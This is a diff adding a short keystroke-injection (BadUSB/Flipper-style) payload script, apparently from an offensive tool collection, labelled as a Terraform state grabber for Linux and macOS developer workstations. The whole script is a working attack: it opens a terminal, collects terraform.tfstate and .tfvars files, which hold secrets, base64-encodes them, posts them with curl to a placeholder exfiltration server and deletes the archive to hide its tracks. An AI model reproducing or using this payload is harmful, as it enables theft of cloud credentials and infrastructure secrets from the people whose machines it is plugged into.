@@ -1,0 +1,14 @@
+REM ===============================================================
+REM Terraform State Grabber - NullSec Flipper Suite
+REM Finds and exfiltrates Terraform state files (contain secrets!)
+REM ===============================================================
+REM Target: Linux/macOS developer workstations
+REM Author: bad-antics
+REM ===============================================================
+
+CTRL ALT t
+DELAY 500
+STRING find ~ -name "terraform.tfstate*" -o -name "*.tfvars" 2>/dev/null | head -20 | tar czf /tmp/tf.tar.gz -T - 2>/dev/null; cat /tmp/tf.tar.gz | base64 | curl -X POST -d @- http://EXFIL_SERVER/terraform; rm /tmp/tf.tar.gz &
+ENTER
+STRING exit
+ENTER
